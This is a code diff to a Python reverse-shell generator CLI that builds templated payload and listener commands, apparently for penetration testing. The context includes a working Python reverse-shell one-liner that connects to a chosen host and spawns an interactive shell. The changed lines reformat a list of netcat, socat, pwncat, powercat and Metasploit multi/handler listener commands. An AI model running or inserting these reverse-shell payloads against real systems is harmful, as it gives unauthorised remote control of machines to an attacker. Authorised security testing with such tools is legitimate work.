@@ -193,10 +193,6 @@ reverse_shell_commands = [
         "meta": ["windows"]
     },
     {
-        "name": "PowerShell #3 (Base64)",
-        "meta": ["windows"]
-    },
-    {
         "name": "Python #1",
         "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
         "meta": ["linux", "mac"]
@@ -397,19 +393,54 @@ msf_venom_commands = [
 ]
 
 listener_commands = [
-    {'name': 'nc', 'command': 'nc -lvnp {port}'},
-    {'name': 'ncat', 'command': 'ncat -lvnp {port}'},
-    {'name': 'ncat (TLS)', 'command': 'ncat --ssl -lvnp {port}'},
-    {'name': 'rlwrap + nc', 'command': 'rlwrap -cAr nc -lvnp {port}'},
-    {'name': 'rustcat', 'command': 'rcat -lp {port}'},
-    {'name': 'rustcat + Command History', 'command': 'rcat -lHp {port}'},
-    {'name': 'pwncat', 'command': 'python3 -m pwncat -lp {port}'},
-    {'name': 'windows ConPty', 'command': 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'},
-    {'name': 'socat', 'command': 'socat -d -d TCP-LISTEN:{port} STDOUT'},
-    {'name': 'socat (TTY)', 'command': 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'},
-    {'name': 'powercat', 'command': 'powercat -l -p {port}'},
-    {'name': 'msfconsole',
-     'command': 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'}
+    {
+        'name': 'nc',
+        'command': 'nc -lvnp {port}'
+    },
+    {
+        'name': 'ncat',
+        'command': 'ncat -lvnp {port}'
+    },
+    {
+        'name': 'ncat (TLS)',
+        'command': 'ncat --ssl -lvnp {port}'
+    },
+    {
+        'name': 'rlwrap + nc',
+        'command': 'rlwrap -cAr nc -lvnp {port}'
+    },
+    {
+        'name': 'rustcat',
+        'command': 'rcat -lp {port}'
+    },
+    {
+        'name': 'rustcat + Command History',
+        'command': 'rcat -lHp {port}'
+    },
+    {
+        'name': 'pwncat',
+        'command': 'python3 -m pwncat -lp {port}'
+    },
+    {
+        'name': 'windows ConPty',
+        'command': 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'
+    },
+    {
+        'name': 'socat',
+        'command': 'socat -d -d TCP-LISTEN:{port} STDOUT'
+    },
+    {
+        'name': 'socat (TTY)',
+        'command': 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'
+    },
+    {
+        'name': 'powercat',
+        'command': 'powercat -l -p {port}'
+    },
+    {
+        'name': 'msfconsole',
+        'command': 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'
+    }
 ]
 
 shells = ['sh',
@@ -432,7 +463,7 @@ from ipaddress import ip_address
 
 class ReverseShellGenerator(Cmd):
     intro: str = colored(
-        "Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.", 'yellow')
+        "Welcome to the reverse shell generator. Type 'help' or '?' to list available commands.", 'yellow')
     prompt: str = colored(">> ", 'yellow')
     ip: str = None
     port: int = None
@@ -506,7 +537,6 @@ class ReverseShellGenerator(Cmd):
                 for i, venom in enumerate(msf_venom_commands):
                     print(colored(f"{i} - {venom['name']}", 'yellow'))
 
-
     def do_get(self, command: str):
         if not self.ip:
             print(colored("The IP address must be set before generating the command. "
@@ -569,12 +599,12 @@ class ReverseShellGenerator(Cmd):
 
     def help_ip(self):
         print(colored(os.linesep.join(['ip [ip_address]',
-                                       'Use the given IP address as the reverse shell IP address',
+                                       'Use the given IP address as the reverse or bind shell IP address',
                                        ]), 'yellow'))
 
     def help_port(self):
         print(colored(os.linesep.join(['port [port]',
-                                       'Use the given port as the reverse port',
+                                       'Use the given port as the reverse or bind port',
                                        ]), 'yellow'))
 
     def help_shell(self):
@@ -602,6 +632,7 @@ class ReverseShellGenerator(Cmd):
                                        "Use 'list' command for getting the index."
                                        ]), 'yellow'))
 
+
 def get_arguments():
     from argparse import ArgumentParser
     parser = ArgumentParser(description="Reverse Shell Generator Script")
@@ -627,7 +658,6 @@ def get_arguments():
                              f"Default is '/bin/sh'.")
     options = parser.parse_args()
     return options
-
 
 
 def main():
